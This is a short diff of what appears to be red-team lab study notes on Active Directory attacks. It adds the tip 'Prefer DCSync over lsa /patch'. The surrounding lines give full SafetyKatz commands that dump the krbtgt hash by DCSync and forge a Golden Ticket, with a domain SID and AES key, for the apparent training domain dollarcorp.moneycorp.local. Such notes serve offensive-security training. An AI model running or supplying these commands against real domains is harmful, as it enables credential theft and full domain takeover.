@@ -18,6 +18,7 @@ C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit" 
 ```
 - Using the DCSync option needs no code execution on the target DC
 - Use active domain user
+- Prefer DCSync over lsa /patch
 - Run the below command to create a Golden ticket on any machine that has network connectivity with DC
 ```
 C:\AD\Tools\BetterSafetykatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
